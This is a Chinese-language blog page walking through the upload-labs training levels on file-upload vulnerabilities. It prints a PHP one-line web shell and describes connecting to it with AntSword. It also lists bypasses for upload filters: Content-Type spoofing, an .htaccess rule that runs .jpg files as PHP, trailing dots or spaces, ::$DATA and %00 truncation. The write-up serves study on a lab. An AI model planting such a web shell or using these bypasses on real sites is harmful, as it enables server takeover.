@@ -1,0 +1,251 @@
+<!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>upload | lu1ux's blog</title><meta name="author" content="lu1ux"><meta name="copyright" content="lu1ux"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="文件上传一句话木马&lt;?php @eval($_POST[x]); ?&gt; $_POST[x]: 获取 POST请求参数中X的值。例如POST请求中传递 x&#x3D;phpinfo();，那么 $_POST[x]就等同于phpinfo();eval（）将字符串当做PHP代码去执行。例如 eval(‘phpinfo();’)，其中 phpinfo();会被当做PHP代码去执行。 中国蚁剑">
+<meta property="og:type" content="article">
+<meta property="og:title" content="upload">
+<meta property="og:url" content="http://example.com/2025/11/25/upload/index.html">
+<meta property="og:site_name" content="lu1ux&#39;s blog">
+<meta property="og:description" content="文件上传一句话木马&lt;?php @eval($_POST[x]); ?&gt; $_POST[x]: 获取 POST请求参数中X的值。例如POST请求中传递 x&#x3D;phpinfo();，那么 $_POST[x]就等同于phpinfo();eval（）将字符串当做PHP代码去执行。例如 eval(‘phpinfo();’)，其中 phpinfo();会被当做PHP代码去执行。 中国蚁剑">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/img/3.jpg">
+<meta property="article:published_time" content="2025-11-25T13:44:39.000Z">
+<meta property="article:modified_time" content="2025-11-25T13:49:38.747Z">
+<meta property="article:author" content="lu1ux">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/img/3.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://example.com/2025/11/25/upload/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=4.13.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: 'Copy Successful',
+    error: 'Copy Error',
+    noSupport: 'Browser Not Supported'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: 'Just now',
+    min: 'minutes ago',
+    hour: 'hours ago',
+    day: 'days ago',
+    month: 'months ago'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.11.1/dist/infinitegrid.min.js',
+    buttonText: 'Load More'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'upload',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2025-11-25 21:49:38'
+}</script><script>(win=>{
+      win.saveToLocal = {
+        set: (key, value, ttl) => {
+          if (ttl === 0) return
+          const now = Date.now()
+          const expiry = now + ttl * 86400000
+          const item = {
+            value,
+            expiry
+          }
+          localStorage.setItem(key, JSON.stringify(item))
+        },
+      
+        get: key => {
+          const itemStr = localStorage.getItem(key)
+      
+          if (!itemStr) {
+            return undefined
+          }
+          const item = JSON.parse(itemStr)
+          const now = Date.now()
+      
+          if (now > item.expiry) {
+            localStorage.removeItem(key)
+            return undefined
+          }
+          return item.value
+        }
+      }
+    
+      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        script.onerror = reject
+        script.onload = script.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          script.onload = script.onreadystatechange = null
+          resolve()
+        }
+
+        Object.keys(attr).forEach(key => {
+          script.setAttribute(key, attr[key])
+        })
+
+        document.head.appendChild(script)
+      })
+    
+      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onerror = reject
+        link.onload = link.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          link.onload = link.onreadystatechange = null
+          resolve()
+        }
+        document.head.appendChild(link)
+      })
+    
+      win.activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+        if (t === 'dark') activateDarkMode()
+        else if (t === 'light') activateLightMode()
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+      const detectApple = () => {
+        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+          document.documentElement.classList.add('apple')
+        }
+      }
+      detectApple()
+    })(window)</script><link rel="stylesheet" href="//at.alicdn.com/t/c/font_4066449_d5kq6u6u9dj.css"><link rel="stylesheet" href="/css/mine.css"><meta name="generator" content="Hexo 8.1.1"></head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">Loading...</div></div></div><script>(()=>{
+  const $loadingBox = document.getElementById('loading-box')
+  const $body = document.body
+  const preloader = {
+    endLoading: () => {
+      $body.style.overflow = ''
+      $loadingBox.classList.add('loaded')
+    },
+    initLoading: () => {
+      $body.style.overflow = 'hidden'
+      $loadingBox.classList.remove('loaded')
+    }
+  }
+
+  preloader.initLoading()
+  window.addEventListener('load',() => { preloader.endLoading() })
+
+  if (false) {
+    document.addEventListener('pjax:send', () => { preloader.initLoading() })
+    document.addEventListener('pjax:complete', () => { preloader.endLoading() })
+  }
+})()</script><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/avator.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">23</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">14</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw iconfont icon-zhuye"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw iconfont icon-archive-solid"></i><span> 归档</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/3.jpg')"><nav id="nav"><span id="blog-info"><a href="/" title="lu1ux's blog"><span class="site-name">lu1ux's blog</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw iconfont icon-zhuye"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw iconfont icon-archive-solid"></i><span> 归档</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">upload</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2025-11-25T13:44:39.000Z" title="Created 2025-11-25 21:44:39">2025-11-25</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2025-11-25T13:49:38.747Z" title="Updated 2025-11-25 21:49:38">2025-11-25</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="upload"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post Views:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h1><h3 id="一句话木马"><a href="#一句话木马" class="headerlink" title="一句话木马"></a>一句话木马</h3><p>&lt;?php @eval($_POST[x]); ?&gt;</p>
+<p>$_POST[x]: 获取 POST请求参数中X的值。例如POST请求中传递 x&#x3D;phpinfo();，那么 $_POST[x]就等同于phpinfo();<br>eval（）将字符串当做PHP代码去执行。例如 eval(‘phpinfo();’)，其中 phpinfo();会被当做PHP代码去执行。</p>
+<p>中国蚁剑</p>
+<p><img src="https://lu1ux-picture.oss-cn-beijing.aliyuncs.com/picture/20251125214740250.png" alt="image-20241110144450782"></p>
+<p>URL地址就是一句话木马的位置</p>
+<p>密码就是x</p>
+<h1 id="upload-labs"><a href="#upload-labs" class="headerlink" title="upload-labs"></a>upload-labs</h1><h2 id="pass-01-前端js绕过"><a href="#pass-01-前端js绕过" class="headerlink" title="pass-01 前端js绕过"></a>pass-01 前端js绕过</h2><h3 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h3><p>上传muma.php发现只允许上传特定类型的文件</p>
+<p><img src="https://lu1ux-picture.oss-cn-beijing.aliyuncs.com/picture/20251125214740253.png" alt="image-20241110145026442"></p>
+<p>使用bp发现抓不到包,判断为前端验证</p>
+<p>直接改一句话木马的文件后缀为jpg,重新上传,抓包</p>
+<p><img src="https://lu1ux-picture.oss-cn-beijing.aliyuncs.com/picture/20251125214740264.png" alt="image-20241110145401812"></p>
+<p>将后缀改回php,上传成功后从新标签页打开图像</p>
+<p><img src="https://lu1ux-picture.oss-cn-beijing.aliyuncs.com/picture/20251125214740269.png" alt="image-20241110145747512"></p>
+<p>复制url,使用中国蚁剑连接</p>
+<p><img src="https://lu1ux-picture.oss-cn-beijing.aliyuncs.com/picture/20251125214740281.png" alt="image-20241110145918485"></p>
+<p>成功到达网站后台</p>
+<p><img src="https://lu1ux-picture.oss-cn-beijing.aliyuncs.com/picture/20251125214740277.png" alt="image-20241110150308207"></p>
+<h2 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h2><p>使用插件关闭js可以直接上传muma.php</p>
+<p><img src="https://lu1ux-picture.oss-cn-beijing.aliyuncs.com/picture/20251125214740784.png" alt="image-20241110150633989"></p>
+<p><img src="https://lu1ux-picture.oss-cn-beijing.aliyuncs.com/picture/20251125214740848.png" alt="image-20241110150642773"></p>
+<h2 id="pass-02-Content-Type绕过"><a href="#pass-02-Content-Type绕过" class="headerlink" title="pass-02  Content-Type绕过"></a>pass-02  Content-Type绕过</h2><p>这次上传muma.php文件bp抓到包了,</p>
+<p><img src="https://lu1ux-picture.oss-cn-beijing.aliyuncs.com/picture/20251125214740890.png" alt="image-20241110151306003"></p>
+<p>上传正确的jpg文件可以上传</p>
+<p>尝试在bp抓到的包里把Content-Type删除</p>
+<p><img src="https://lu1ux-picture.oss-cn-beijing.aliyuncs.com/picture/20251125214740935.png" alt="image-20241110151646621"></p>
+<p>将Content-Type删除后发现提示文件类型不正确,判断大概率含有Content-Type检测</p>
+<p>上传jpg文件的Content-Type: image&#x2F;jpeg</p>
+<p>上传php文件的Content-Type: application&#x2F;octet-stream</p>
+<p>上传muma.php时将Content-Type改为image&#x2F;jpeg</p>
+<p><img src="https://lu1ux-picture.oss-cn-beijing.aliyuncs.com/picture/20251125214740985.png" alt="image-20241110152025536"></p>
+<p>成功上传,之后可以连接蚁剑</p>
+<h2 id="PASS-03-特殊后缀绕过"><a href="#PASS-03-特殊后缀绕过" class="headerlink" title="PASS-03  特殊后缀绕过"></a>PASS-03  特殊后缀绕过</h2><p>上传muma.php发现提示不允许上传某些类型的文件</p>
+<p><img src="https://lu1ux-picture.oss-cn-beijing.aliyuncs.com/picture/20251125214741091.png" alt="image-20241110152850122"></p>
+<p>查看源代码发现是有黑名单</p>
+<p><img src="https://lu1ux-picture.oss-cn-beijing.aliyuncs.com/picture/20251125214741354.png" alt="image-20241110152916347"></p>
+<p>看了教程,发现这道题的本意是要用.php3  .php5 等可执行后缀来上传,可能由于我搭建的靶场问题,无法复现</p>
+<h2 id="PASS-04-htaccess绕过"><a href="#PASS-04-htaccess绕过" class="headerlink" title="PASS-04 .htaccess绕过"></a>PASS-04 .htaccess绕过</h2><p><img src="https://lu1ux-picture.oss-cn-beijing.aliyuncs.com/picture/20251125214741433.png" alt="image-20241110162719170"></p>
+<p><img src="https://lu1ux-picture.oss-cn-beijing.aliyuncs.com/picture/20251125214741488.png" alt="image-20241110162227374"></p>
+<p>调整了一下Apache的配置文件</p>
+<p><img src="/./../../../task/%E7%AC%94%E8%AE%B0/picture/image-20241216182953578.png" alt="image-20241216182953578"></p>
+<p>.htaccess是一个纯文本文件，它里面存放着Apache服务器配置相关的指令。</p>
+<p>它的作用范围主要针对当前目录</p>
+<p>创建一个.htaccess文件,内容为</p>
+<p>Addtype application&#x2F;x-httpd-php .jpg .txt</p>
+<p>意思是将上传的.jpg和.txt文件也作为php文件运行</p>
+<p><img src="https://lu1ux-picture.oss-cn-beijing.aliyuncs.com/picture/20251125214741555.png" alt="image-20241110162404765"></p>
+<p><img src="https://lu1ux-picture.oss-cn-beijing.aliyuncs.com/picture/20251125214741601.png" alt="image-20241110162756639"></p>
+<h2 id="PASS-05-user-ini"><a href="#PASS-05-user-ini" class="headerlink" title="PASS-05 .user.ini"></a>PASS-05 .user.ini</h2><p><img src="https://lu1ux-picture.oss-cn-beijing.aliyuncs.com/picture/20251125214741675.png" alt="image-20241110163039911"></p>
+<p><img src="https://lu1ux-picture.oss-cn-beijing.aliyuncs.com/picture/20251125214742006.png" alt="image-20241110163244347"></p>
+<p><img src="https://lu1ux-picture.oss-cn-beijing.aliyuncs.com/picture/20251125214742089.png" alt="image-20241110163308007"></p>
+<p><img src="https://lu1ux-picture.oss-cn-beijing.aliyuncs.com/picture/20251125214742171.png" alt="image-20241110163425300"></p>
+<p><img src="https://lu1ux-picture.oss-cn-beijing.aliyuncs.com/picture/20251125214742252.png" alt="image-20241110163902279"></p>
+<p><img src="https://lu1ux-picture.oss-cn-beijing.aliyuncs.com/picture/20251125214742334.png" alt="image-20241110164257972"></p>
+<h3 id="法二-点空格点绕过"><a href="#法二-点空格点绕过" class="headerlink" title="法二:点空格点绕过"></a>法二:点空格点绕过</h3><p>用bp抓包,将文件名改为muma.php. .</p>
+<p><img src="https://lu1ux-picture.oss-cn-beijing.aliyuncs.com/picture/20251125214742413.png" alt="image-20241110171920569"></p>
+<h2 id="PASS-10-大写绕过"><a href="#PASS-10-大写绕过" class="headerlink" title="PASS-10 大写绕过"></a>PASS-10 大写绕过</h2><p>抓包后</p>
+<p>将.php改成.Php即可绕过</p>
+<h2 id="PASS-06-空格绕过"><a href="#PASS-06-空格绕过" class="headerlink" title="PASS-06 空格绕过"></a>PASS-06 空格绕过</h2><p>抓包后</p>
+<p>在.php后加空格即可</p>
+<h2 id="PASS-07-加点绕过"><a href="#PASS-07-加点绕过" class="headerlink" title="PASS-07 加点绕过"></a>PASS-07 加点绕过</h2><p>抓包后</p>
+<p>在.php后加点即可 即.php.</p>
+<h2 id="PASS-08-DATA绕过"><a href="#PASS-08-DATA绕过" class="headerlink" title="PASS-08 ::$DATA绕过"></a>PASS-08 ::$DATA绕过</h2><p>看源码发现没有过滤::$DATA</p>
+<p>补充知识：php在window的时候如果文件名+”::$DATA”会把::$DATA之后的数据当成文件流处理,不会检测后缀名，且保持”::$DATA”之前的文件名 他的目的就是不检查后缀名。</p>
+<p><img src="https://lu1ux-picture.oss-cn-beijing.aliyuncs.com/picture/20251125214936255.png" alt="image-20241216161930807"></p>
+<h2 id="PASS-09点空格点绕过"><a href="#PASS-09点空格点绕过" class="headerlink" title="PASS-09点空格点绕过"></a>PASS-09点空格点绕过</h2><p>抓包,修改后缀</p>
+<h2 id="PASS-11-GET00截断"><a href="#PASS-11-GET00截断" class="headerlink" title="PASS-11 GET00截断"></a>PASS-11 GET00截断</h2><p>php的一些函数的底层是C语言，而move_uploaded_file就是其中之一，遇到0x00会截断，0x表示16进制，URL中%00解码成16进制就是0x00。</p>
+<p>数据包中必须含有上传后文件的目录情况才可以用，比如数据包中存在path: uploads&#x2F;，那么攻击者可以通过修改path的值来构造paylod: uploads&#x2F;aa.php%00</p>
+<h3 id="php环境00截断的条件"><a href="#php环境00截断的条件" class="headerlink" title="php环境00截断的条件"></a>php环境00截断的条件</h3><ul>
+<li>php版本小于5.3.29</li>
+<li>magic_quotes_gpc &#x3D; Off</li>
+</ul>
+<p><img src="https://lu1ux-picture.oss-cn-beijing.aliyuncs.com/picture/20251125214852210.png" alt="image-20241216165245004"></p>
+<p>提示上传失败,那么可能是某些配置文件没调好</p>
+<p>发现配的是对的呢</p>
+<p><img src="https://lu1ux-picture.oss-cn-beijing.aliyuncs.com/picture/20251125214918395.png" alt="image-20241216165716808"></p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>Author: </span><span class="post-copyright-info"><a href="http://example.com">lu1ux</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>Link: </span><span class="post-copyright-info"><a href="http://example.com/2025/11/25/upload/">http://example.com/2025/11/25/upload/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="tag_share"><div class="post_share"><div class="social-share" data-image="/img/3.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2025/11/25/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/" title="信息泄露"><img class="cover" src="/img/24.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">Previous</div><div class="prev_info">信息泄露</div></div></a></div><div class="next-post pull-right"><a href="/2025/11/25/SSRF/" title="SSRF"><img class="cover" src="/img/13.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">Next</div><div class="next_info">SSRF</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/avator.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">lu1ux</div><div class="author-info__description"></div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">23</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">14</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/lu1ux"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>Announcement</span></div><div class="announcement_content">网安小白一枚</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Contents</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0"><span class="toc-number">1.</span> <span class="toc-text">文件上传</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC"><span class="toc-number">1.1.</span> <span class="toc-text">一句话木马</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#upload-labs"><span class="toc-number">2.</span> <span class="toc-text">upload-labs</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#pass-01-%E5%89%8D%E7%AB%AFjs%E7%BB%95%E8%BF%87"><span class="toc-number">2.1.</span> <span class="toc-text">pass-01 前端js绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%B8%80"><span class="toc-number">2.1.1.</span> <span class="toc-text">方法一</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%BA%8C"><span class="toc-number">2.2.</span> <span class="toc-text">方法二</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pass-02-Content-Type%E7%BB%95%E8%BF%87"><span class="toc-number">2.3.</span> <span class="toc-text">pass-02  Content-Type绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PASS-03-%E7%89%B9%E6%AE%8A%E5%90%8E%E7%BC%80%E7%BB%95%E8%BF%87"><span class="toc-number">2.4.</span> <span class="toc-text">PASS-03  特殊后缀绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PASS-04-htaccess%E7%BB%95%E8%BF%87"><span class="toc-number">2.5.</span> <span class="toc-text">PASS-04 .htaccess绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PASS-05-user-ini"><span class="toc-number">2.6.</span> <span class="toc-text">PASS-05 .user.ini</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%95%E4%BA%8C-%E7%82%B9%E7%A9%BA%E6%A0%BC%E7%82%B9%E7%BB%95%E8%BF%87"><span class="toc-number">2.6.1.</span> <span class="toc-text">法二:点空格点绕过</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PASS-10-%E5%A4%A7%E5%86%99%E7%BB%95%E8%BF%87"><span class="toc-number">2.7.</span> <span class="toc-text">PASS-10 大写绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PASS-06-%E7%A9%BA%E6%A0%BC%E7%BB%95%E8%BF%87"><span class="toc-number">2.8.</span> <span class="toc-text">PASS-06 空格绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PASS-07-%E5%8A%A0%E7%82%B9%E7%BB%95%E8%BF%87"><span class="toc-number">2.9.</span> <span class="toc-text">PASS-07 加点绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PASS-08-DATA%E7%BB%95%E8%BF%87"><span class="toc-number">2.10.</span> <span class="toc-text">PASS-08 ::$DATA绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PASS-09%E7%82%B9%E7%A9%BA%E6%A0%BC%E7%82%B9%E7%BB%95%E8%BF%87"><span class="toc-number">2.11.</span> <span class="toc-text">PASS-09点空格点绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PASS-11-GET00%E6%88%AA%E6%96%AD"><span class="toc-number">2.12.</span> <span class="toc-text">PASS-11 GET00截断</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#php%E7%8E%AF%E5%A2%8300%E6%88%AA%E6%96%AD%E7%9A%84%E6%9D%A1%E4%BB%B6"><span class="toc-number">2.12.1.</span> <span class="toc-text">php环境00截断的条件</span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Post</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2025/11/25/URLDNS/" title="URLDNS"><img src="/img/12.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="URLDNS"/></a><div class="content"><a class="title" href="/2025/11/25/URLDNS/" title="URLDNS">URLDNS</a><time datetime="2025-11-25T14:03:06.000Z" title="Created 2025-11-25 22:03:06">2025-11-25</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/11/25/CC%E9%93%BE/" title="CC链"><img src="/img/9.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="CC链"/></a><div class="content"><a class="title" href="/2025/11/25/CC%E9%93%BE/" title="CC链">CC链</a><time datetime="2025-11-25T14:02:54.000Z" title="Created 2025-11-25 22:02:54">2025-11-25</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/11/25/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/" title="信息泄露"><img src="/img/24.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="信息泄露"/></a><div class="content"><a class="title" href="/2025/11/25/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/" title="信息泄露">信息泄露</a><time datetime="2025-11-25T13:50:42.000Z" title="Created 2025-11-25 21:50:42">2025-11-25</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/11/25/upload/" title="upload"><img src="/img/3.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="upload"/></a><div class="content"><a class="title" href="/2025/11/25/upload/" title="upload">upload</a><time datetime="2025-11-25T13:44:39.000Z" title="Created 2025-11-25 21:44:39">2025-11-25</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/11/25/SSRF/" title="SSRF"><img src="/img/13.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="SSRF"/></a><div class="content"><a class="title" href="/2025/11/25/SSRF/" title="SSRF">SSRF</a><time datetime="2025-11-25T13:44:33.000Z" title="Created 2025-11-25 21:44:33">2025-11-25</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2025 By lu1ux</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Toggle Between Light And Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle between Single-column and Double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="Setting"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table Of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back To Top"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=4.13.0"></script><script src="/js/main.js?v=4.13.0"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><script src="/js/sakuraPlus.js"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
